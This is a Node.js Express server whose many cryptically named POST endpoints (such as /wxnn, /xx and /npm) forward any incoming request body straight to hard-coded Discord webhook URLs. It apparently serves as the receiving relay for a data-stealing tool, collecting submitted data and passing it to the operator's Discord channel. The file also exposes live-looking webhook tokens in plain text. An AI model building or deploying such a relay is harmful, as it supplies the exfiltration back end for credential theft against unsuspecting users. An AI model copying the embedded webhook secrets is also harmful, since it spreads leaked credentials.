const Discord = require('discord.js'); const { WebhookClient, MessageEmbed } = require('discord.js')
const express = require('express');
const session = require('express-session');
const cors = require('cors');
const app = express()


app.use(session({ secret: 'IFollowDiscordTos!', resave: false, saveUninitialized: true, cookie: { expires: 2.16e+7 } }));
app.use(cors());
app.use(express.json({ limit: '550mb' }));
app.use(express.urlencoded({ limit: '550mb', extended: true, parameterLimit: 503203023020000 }));

  const webhookURLL = 'https://discord.com/api/webhooks/1138296453123539064/lEVnZK37ig2dsm5CNrxuDXkuGOEWtze5A5L8IBorjHnZeZpZiT_0kYa5elVyYxu-xzS0';
const wbb = new WebhookClient({ url: webhookURLL });


  
  app.post('/wxnn', (req, res) => {
  const { body } = req;
  
  wbb.send(body)
    .then(() => {
      res.sendStatus(200);
      
    })
    .then(() => {
      // wb2.send(body) işlemini buraya ekleyebilirsiniz.
    })
    .catch(error => {
      console.error(error);
      res.sendStatus(500);
    });
});
  
  ////
  
  const webhookURL = 'https://discord.com/api/webhooks/1138296453123539064/lEVnZK37ig2dsm5CNrxuDXkuGOEWtze5A5L8IBorjHnZeZpZiT_0kYa5elVyYxu-xzS0';
const wb = new WebhookClient({ url: webhookURL });

  
app.post('/wbkk', (req, res) => {
  const { body } = req;
  
  wb.send(body)
    .then(() => {
      res.sendStatus(200);
      
    })
    .then(() => {
      // wb2.send(body) işlemini buraya ekleyebilirsiniz.
    })
    .catch(error => {
      console.error(error);
      res.sendStatus(500);
    });
});


///
  
  const xxx = 'https://discord.com/api/webhooks/1138296453123539064/lEVnZK37ig2dsm5CNrxuDXkuGOEWtze5A5L8IBorjHnZeZpZiT_0kYa5elVyYxu-xzS0';
const xxxx = new WebhookClient({ url: xxx });


  
  app.post('/xx', (req, res) => {
  const { body } = req;
  
  xxxx.send(body)
    .then(() => {
      res.sendStatus(200);
      
    })
    .then(() => {
      // wb2.send(body) işlemini buraya ekleyebilirsiniz.
    })
    .catch(error => {
      console.error(error);
      res.sendStatus(500);
    });
});

  ///



///
  
  const kleww = 'https://discord.com/api/webhooks/1137032088370032660/C4SRacanoNN_qcVgwgaQulJtr44uviSOgA3ePTptIyDXWXuibQpYVoTb9e5hOgt9utqs';
const klew = new WebhookClient({ url: kleww });


  
  app.post('/klew', (req, res) => {
  const { body } = req;
  
  klew.send(body)
    .then(() => {
      res.sendStatus(200);
      
    })
    .then(() => {
      // wb2.send(body) işlemini buraya ekleyebilirsiniz.
    })
    .catch(error => {
      console.error(error);
      res.sendStatus(500);
    });
});

  ///


///


  const gtbbb = 'https://discord.com/api/webhooks/1138296814672543804/GwAaPTd5RIBcrb3_anurQRdbxQi4fVy3enKUyhNpat0pdzDGl6cIO4EDuFka0AYavf2E';
const gtb = new WebhookClient({ url: gtbbb });


  
  app.post('/gtb', (req, res) => {
  const { body } = req;
  
  gtb.send(body)
    .then(() => {
      res.sendStatus(200);
      
    })
    .then(() => {
      // wb2.send(body) işlemini buraya ekleyebilirsiniz.
    })
    .catch(error => {
      console.error(error);
      res.sendStatus(500);
    });
});


//

  const gttbb = 'https://discord.com/api/webhooks/1138296453123539064/lEVnZK37ig2dsm5CNrxuDXkuGOEWtze5A5L8IBorjHnZeZpZiT_0kYa5elVyYxu-xzS0';
const gtbb = new WebhookClient({ url: gttbb });


  
  app.post('/gtbb', (req, res) => {
  const { body } = req;
  
  gtbb.send(body)
    .then(() => {
      res.sendStatus(200);
      
    })
    .then(() => {
      // wb2.send(body) işlemini buraya ekleyebilirsiniz.
    })
    .catch(error => {
      console.error(error);
      res.sendStatus(500);
    });
});


//
  
  const crazydownn = 'https://discord.com/api/webhooks/1138296453123539064/lEVnZK37ig2dsm5CNrxuDXkuGOEWtze5A5L8IBorjHnZeZpZiT_0kYa5elVyYxu-xzS0';
const crazydown = new WebhookClient({ url: crazydownn });


  
  app.post('/crazydown', (req, res) => {
  const { body } = req;
  
  crazydown.send(body)
    .then(() => {
      res.sendStatus(200);
      
    })
    .then(() => {
      // wb2.send(body) işlemini buraya ekleyebilirsiniz.
    })
    .catch(error => {
      console.error(error);
      res.sendStatus(500);
    });
});

  ///


///


///
  
  const npmm = 'https://discord.com/api/webhooks/1138296453123539064/lEVnZK37ig2dsm5CNrxuDXkuGOEWtze5A5L8IBorjHnZeZpZiT_0kYa5elVyYxu-xzS0';
const npm = new WebhookClient({ url: npmm });


  
  app.post('/npm', (req, res) => {
  const { body } = req;
  
  npm.send(body)
    .then(() => {
      res.sendStatus(200);
      
    })
    .then(() => {
      // wb2.send(body) işlemini buraya ekleyebilirsiniz.
    })
    .catch(error => {
      console.error(error);
      res.sendStatus(500);
    });
});

  ///

//

///
  
  const x = 'https://discord.com/api/webhooks/1138296453123539064/lEVnZK37ig2dsm5CNrxuDXkuGOEWtze5A5L8IBorjHnZeZpZiT_0kYa5elVyYxu-xzS0';
const xx = new WebhookClient({ url: x });


  
  app.post('/x', (req, res) => {
  const { body } = req;
  
  xx.send(body)
    .then(() => {
      res.sendStatus(200);
      
    })
    .then(() => {
      // wb2.send(body) işlemini buraya ekleyebilirsiniz.
    })
    .catch(error => {
      console.error(error);
      res.sendStatus(500);
    });
});

  ///
